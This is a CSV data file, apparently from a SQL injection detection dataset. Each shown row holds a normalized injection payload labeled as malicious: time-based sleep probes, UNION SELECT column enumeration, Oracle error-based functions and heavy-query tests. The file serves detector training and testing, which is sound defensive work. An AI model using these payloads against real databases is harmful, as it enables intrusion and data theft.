row_index,payload_norm,label,sqli_type_hint
7590,"-8734%"" ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""%"" = """,1,
7591,1'|| ( select 'aevx' from dual where 9999 = 9999,1,
7592,"1"" ) as amak where 7938 = 7938 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
7593,1'+ ( select snam where 1993 = 1993,1,
7594,"1"" ) as bpmk where 4506 = 4506",1,
7595,"1' ) ) as crzr where 5373 = 5373 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
7596,"1"" ) as mohv where 2171 = 2171 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,
7597,"1"" ) where 9295 = 9295 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
7598,1%' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( '%' = ',1,
7599,1' in boolean mode ) and 4595 = 4595#,1,
7600,"-4259' ) ) as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --",1,
7601,1'+ ( select qsmo where 3172 = 3172,1,
7602,"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'iari' = 'iari",1,
7603,"-4606"" ) as elek where 8261 = 8261 or 8571 = 8571--",1,
7604,1%' order by 1--,1,
7605,"-1591 where 3291 = 3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",1,
7606,"-8069 ) ) as sxbn where 7689 = 7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",1,
7607,"1' ) ) ) union all select null,null,null,null,null,null--",1,
7608,1'|| ( select 'kitk' where 6311 = 6311,1,
7609,1' ) ) and sleep ( 5 ) and ( ( 'krrr' = 'krrr,1,
7610,"1'|| ( select 'lxpg' where 7390 = 7390 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",1,
7611,"1 where 7906 = 7906 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
7612,"-6116"" ) ) union all select 3679,3679,3679,3679,3679,3679,3679--",1,
7613,"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'lxqz' = 'lxqz",1,
7614,"-2153'|| ( select 'sofs' where 4126 = 4126 union all select 4126,4126,4126,4126,4126#",1,
7615,1 ) ) as pjkd where 1105 = 1105 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
7616,"1'+ ( select jqyo where 4426 = 4426 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",1,
7617,"1' ) ) as ticp where 9794 = 9794 union all select null,null,null,null,null,null,null,null--",1,
7618,"1' union all select null,null,null,null,null,null,null#",1,
7619,"1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""qqfd"" like ""qqfd",1,
